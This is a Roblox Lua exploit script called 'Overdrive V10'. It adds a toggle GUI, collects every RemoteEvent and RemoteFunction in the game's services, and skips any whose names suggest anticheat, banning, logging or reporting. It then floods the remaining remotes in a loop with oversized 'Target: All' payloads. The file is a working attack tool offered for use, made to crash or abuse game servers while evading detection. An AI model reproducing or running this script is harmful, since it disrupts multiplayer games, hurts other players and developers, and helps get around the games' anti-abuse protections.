--[[
    ✨ LALOL OVERDRIVE: THE "SEEN & HEARD" EDITION ✨
    FIXED GUI | ALL FOLDERS | LIVE LOGGING
]]

local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local G2L = {};

-- 🎨 THE VANITY WARDROBE (GUI) - NOW IN PLAYERGUI FOR VISIBILITY
G2L["1"] = Instance.new("ScreenGui", PlayerGui);
G2L["1"]["Name"] = [[LALOL_Overdrive_V10_Visible]];
G2L["1"]["ResetOnSpawn"] = false;

G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(15, 5, 20); 
G2L["2"]["Size"] = UDim2.new(0, 420, 0, 160);
G2L["2"]["Position"] = UDim2.new(0.5, -210, 0.5, -80);
G2L["2"]["Active"] = true;
G2L["2"]["Draggable"] = true; -- Extra help just in case!

G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Thickness"] = 3;
G2L["4"]["Color"] = Color3.fromRGB(255, 0, 200); -- Neon Pink Realness

G2L["Button"] = Instance.new("TextButton", G2L["2"]);
G2L["Button"]["Size"] = UDim2.new(0.85, 0, 0.45, 0);
G2L["Button"]["Position"] = UDim2.new(0.075, 0, 0.45, 0);
G2L["Button"]["Text"] = "SERVE: OFF";
G2L["Button"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy);
G2L["Button"]["TextSize"] = 26;
G2L["Button"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Button"]["BackgroundTransparency"] = 1;

G2L["Title"] = Instance.new("TextLabel", G2L["2"]);
G2L["Title"]["Size"] = UDim2.new(1, 0, 0.35, 0);
G2L["Title"]["Text"] = "OVERDRIVE V10 (VISIBLE & LOUD)";
G2L["Title"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Title"]["TextSize"] = 22;
G2L["Title"]["BackgroundTransparency"] = 1;

-- 🛡️ THE "NOT-ON-THE-LIST" BLACKLIST
local blacklist = { 
    "updatecurrentcall", "call", "voice", "tutorial", "starttutorial", "loading", 
    "intro", "cutscene", "rebirth", "rebirthevent", "rsvp", "social", "friend", 
    "invite", "party", "timer", "clock", "time", "sync", "stopfalling", 
    "stopfallingactive", "velocity", "noclip", "fly", "gravity", "falling", 
    "kick", "ban", "admin", "check", "detect", "anticheat", "security", 
    "integrity", "processor", "cmdr", "dispatcher", "log", "report", 
    "teleport", "placeid", "transfer", "universe", "jump", "join", "queue", 
    "arena", "lobby" 
}

-- 📂 THE TARGET LIST (EVERYWHERE WE’RE STRUTTING)
local highProfileFolders = {
    game:GetService("Workspace"),
    game:GetService("Players"),
    game:GetService("Lighting"),
    game:GetService("MaterialService"),
    game:GetService("ReplicatedFirst"),
    game:GetService("ReplicatedStorage"),
    game:GetService("ServerScriptService"),
    game:GetService("ServerStorage"),
    game:GetService("StarterGui"),
    game:GetService("StarterPack"),
    game:GetService("StarterPlayer"),
    game:GetService("Teams"),
    game:GetService("SoundService"),
    game:GetService("TextChatService")
}

-- 🔥 THE ENGINE 🔥
local autoFiring = false
local targets = {}

local function scan()
    table.clear(targets)
    for _, service in ipairs(highProfileFolders) do
        pcall(function()
            for _, desc in ipairs(service:GetDescendants()) do
                if (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) then
                    local name = string.lower(desc.Name)
                    local isSafe = true
                    for _, b in ipairs(blacklist) do
                        if string.find(name, b) then isSafe = false break end
                    end
                    if isSafe then
                        table.insert(targets, desc)
                    end
                end
            end
        end)
    end
    print("✨ Found " .. #targets .. " remotes! Let the show begin. ✨")
end

-- ⚡ THE FIRING LOOP (NOW PRINTING NAMES!) ⚡
task.spawn(function()
    while true do
        if autoFiring and #targets > 0 then
            -- Shuffle for that chaotic vibe
            for i = #targets, 2, -1 do
                local j = math.random(i); targets[i], targets[j] = targets[j], targets[i]
            end
            
            for i, remote in ipairs(targets) do
                if not autoFiring then break end
                
                -- ✨ PRINTING THE TARGET TO CONSOLE ✨
                print("🔥 [OVERDRIVE] Calling out: " .. remote:GetFullName())

                task.spawn(function()
                    pcall(function()
                        local bomb = {["Target"] = "All", ["State"] = math.huge, ["Overflow"] = true}
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(bomb, "Everyone", 999999)
                        else
                            remote:InvokeServer(bomb, "Everyone", 999999)
                        end
                    end)
                end)
                
                if i % 4 == 0 then task.wait(0.08) end
            end
        end
        task.wait(1.5)
    end
end)

G2L["Button"].MouseButton1Click:Connect(function()
    autoFiring = not autoFiring
    G2L["Button"].Text = autoFiring and "SERVING TRUTH... ⚡" or "SERVE: OFF"
    G2L["Button"].TextColor3 = autoFiring and Color3.fromRGB(255, 0, 200) or Color3.fromRGB(255, 255, 255)
    if autoFiring then scan() end
end)

print("💖 Overdrive v10 Live! Check your console (F9) to see the tea! 💖")
